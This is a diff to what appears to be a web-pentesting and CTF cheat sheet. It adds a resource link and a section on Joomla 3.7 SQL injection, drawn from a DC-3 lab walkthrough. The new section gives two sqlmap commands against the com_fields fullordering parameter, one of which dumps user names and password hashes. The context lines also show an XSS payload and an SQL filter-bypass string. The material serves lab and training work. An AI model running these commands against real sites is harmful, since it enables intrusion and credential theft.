@@ -9,6 +9,7 @@ https://highon.coffee/blog/lfi-cheat-sheet/
 https://saadahmedx.medium.com/weaponizing-xss-for-fun-profit-a1414f3fcee9  
 https://github.com/swisskyrepo/PayloadsAllTheThings  
 https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf  
+https://github.com/Ignitetechnologies/Web-Application-Cheatsheet  
 
 ### CTF resources
 https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Exploiting%20Improper%20Redirection%20in%20PHP%20Web%20Applications.pdf  
@@ -795,3 +796,12 @@ Alternative Unicode
 `<!--><script>alert/**/()/**/</script>`
 
 `/?id=1+un/**/ion+sel/**/ect+1,2,3--`
+
+### joomla sqli for 3.7
+https://www.hackingarticles.in/dc-3-walkthrough/
+
+```
+sqlmap -u "http://<ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla --tables --batch
+
+sqlmap -u "http://<ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' -C name,password --dump --batch
+```
